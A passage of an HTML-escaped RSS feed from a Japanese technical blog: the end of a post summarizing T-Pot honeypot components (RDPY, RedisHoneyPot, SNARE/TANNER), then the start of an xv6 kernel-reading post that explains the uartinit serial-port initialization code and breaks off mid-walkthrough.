&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;HL7/FHIR&lt;/code&gt;って何だろうと思ったのですが、医療情報交換のために標準化されつつある通信プロトコルみたいです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.mhlw.go.jp/stf/newpage_15747.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;HL7 FHIRに関する調査研究&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;やっぱり医療関係って結構ターゲットにされてるんですね。&lt;/p&gt;
&lt;h3 id=&quot;rdpy&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#rdpy&quot; aria-label=&quot;rdpy permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;RDPY&lt;/h3&gt;
&lt;p&gt;「RDPY」はMicrosoft RDPをPythonで実装したハニーポットです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/citronneur/rdpy&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;citronneur/rdpy: Remote Desktop Protocol in Twisted Python&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;redishoneypot&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#redishoneypot&quot; aria-label=&quot;redishoneypot permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;RedisHoneyPot&lt;/h3&gt;
&lt;p&gt;「RedisHoneyPot」はRedisプロトコルをターゲットにしたハニーポットです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/cypwnpwnsocute/RedisHoneyPot&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;cypwnpwnsocute/RedisHoneyPot: High Interaction Honeypot Solution for Redis protocol&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Golang製。&lt;/p&gt;
&lt;h3 id=&quot;snare-and-tanner&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#snare-and-tanner&quot; aria-label=&quot;snare and tanner permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SNARE and TANNER&lt;/h3&gt;
&lt;p&gt;「SNARE」と「TANNER」はWebアプリケーションのハニーポットセンサです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;http://mushmush.org/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;MushMush&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;「TANNER」は「SNARE」がキャプチャしたイベントを評価し、「SNARE」が攻撃者に対してどのように応答するかを決定するモジュールみたいです。&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;とりあえず現行(2022/02/15時点)で最新版のT-Potのコンポーネントについて一通りまとめてみました。&lt;/p&gt;
&lt;p&gt;そろそろ実運用開始したいですが、まだいろいろとやることが多そうです。&lt;/p&gt;</content:encoded></item><item><title><![CDATA[xv6OSを真面目に読みこんでカーネルを完全に理解する -シリアルポート 編-]]></title><description><![CDATA[教育用OSのxv6OSのソースコードを読んでカーネルについて学んでいきます。この記事ではxv6OSのカーネルのmain関数の挙動を読み解きます。]]></description><link>https://kashiwaba-yuki.com/unix-xv6-011-kernel-main-08</link><guid isPermaLink="false">https://kashiwaba-yuki.com/unix-xv6-011-kernel-main-08</guid><pubDate>Sun, 13 Feb 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;にインスパイアされて&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;を読んでます。&lt;/p&gt;
&lt;p&gt;UNIX V6自体はx86CPUでは動作しないため、基本的には、UNIXv6をX86アーキテクチャで動くようにした&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;のリポジトリをForkした&lt;a href=&quot;https://github.com/kash1064/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;kash1064/xv6-public: xv6 OS&lt;/a&gt;のソースコードを読んでいくことにしました。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/unix-xv6-010-kernel-main-07&quot;&gt;前回&lt;/a&gt;は&lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt;関数で実行される&lt;code class=&quot;language-text&quot;&gt;consoleinit&lt;/code&gt;関数の動きを確認しました。&lt;/p&gt;
&lt;p&gt;今回は&lt;code class=&quot;language-text&quot;&gt;uartinit&lt;/code&gt;関数の挙動を追っていきます。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#uartinit%E9%96%A2%E6%95%B0&quot;&gt;uartinit関数&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#uart%E3%81%A8%E3%81%AF&quot;&gt;UARTとは&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E9%80%9A%E4%BF%A1%E3%81%AB%E3%82%B7%E3%83%AA%E3%82%A2%E3%83%AB%E3%83%9D%E3%83%BC%E3%83%88%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B&quot;&gt;通信にシリアルポートを使用する&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot;&gt;参考書籍&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;uartinit関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#uartinit%E9%96%A2%E6%95%B0&quot; aria-label=&quot;uartinit関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;uartinit関数&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;uartinit&lt;/code&gt;関数は&lt;code class=&quot;language-text&quot;&gt;uart.c&lt;/code&gt;関数で定義された関数で、シリアルポート関連の初期化を行っています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;COM1&lt;/span&gt;    &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x3f8&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; uart&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;token comment&quot;&gt;// is there a uart?&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;uartinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Turn off the FIFO&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// 9600 baud, 8 data bits, 1 stop bit, parity off.&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;token comment&quot;&gt;// Unlock divisor&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;115200&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;9600&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x03&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;token comment&quot;&gt;// Lock divisor, 8 data bits.&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;token comment&quot;&gt;// Enable receive interrupts.&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// If status is 0xFF, no serial port.&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;inb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uart &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Acknowledge pre-existing interrupt conditions;&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// enable interrupts.&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;inb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;inb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;ioapicenable&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;IRQ_COM1&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Announce that we&apos;re here.&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;p&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;xv6...\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; p&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;uartputc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;uartとは&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#uart%E3%81%A8%E3%81%AF&quot; aria-label=&quot;uartとは permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;UARTとは&lt;/h3&gt;
&lt;p&gt;そもそもUARTとは何かですが、&lt;code class=&quot;language-text&quot;&gt;**Universal Asynchronous Receiver/Transmitter**（汎用非同期送受信機）&lt;/code&gt;を指すようです。&lt;/p&gt;
&lt;p&gt;UARTは、2つのデバイス間でシリアルデータを交換するためのプロトコルを指します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.rohde-schwarz.com/jp/products/test-and-measurement/oscilloscopes/educational-content/understanding-uart_254524.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;UARTの概要 | Rohde &amp;#x26; Schwarz&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/Universal_asynchronous_receiver-transmitter&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Universal asynchronous receiver-transmitter - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;近年では主として使われていないようですが、UARTはシリアルポートによる通信で使用されていたプロトコルみたいです。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;uartinit&lt;/code&gt;関数では、いわゆるCOMポートをセットアップしているようですね。&lt;/p&gt;
&lt;h3 id=&quot;通信にシリアルポートを使用する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E9%80%9A%E4%BF%A1%E3%81%AB%E3%82%B7%E3%83%AA%E3%82%A2%E3%83%AB%E3%83%9D%E3%83%BC%E3%83%88%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B&quot; aria-label=&quot;通信にシリアルポートを使用する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;通信にシリアルポートを使用する&lt;/h3&gt;
&lt;p&gt;OSが通信にシリアルポートを使用する場合は、初めにシリアルポートを初期化する必要があります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://wiki.osdev.org/Serial_Ports&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Serial Ports - OSDev Wiki&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ソースコードを順に見ていきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;COM1&lt;/span&gt;    &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x3f8&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Turn off the FIFO&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;COM1&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;0x3f8&lt;/code&gt;として定義されています。&lt;/p&gt;
&lt;p&gt;これは、固定されたCOM1ポートのIOポートのアドレスです。&lt;/p&gt;
&lt;p&gt;各COMポートのレジスタについては、IOポートアドレスからのオフセットでアクセスできます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;COM1+2&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;Interrupt Identification&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;FIFO control registers&lt;/code&gt;を指します。&lt;/p&gt;
&lt;p&gt;ここでは、0をセットすることでUART内のFIFOの動作を無効化しています。&lt;/p&gt;
&lt;p&gt;FIFOが無効化されている場合、受信したデータは&lt;code class=&quot;language-text&quot;&gt;Receiver buffer register&lt;/code&gt;に受け渡されます。&lt;/p&gt;
&lt;p&gt;続いて、以下のコードを見てみます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// 9600 baud, 8 data bits, 1 stop bit, parity off.&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;token comment&quot;&gt;// Unlock divisor&lt;/span&gt;
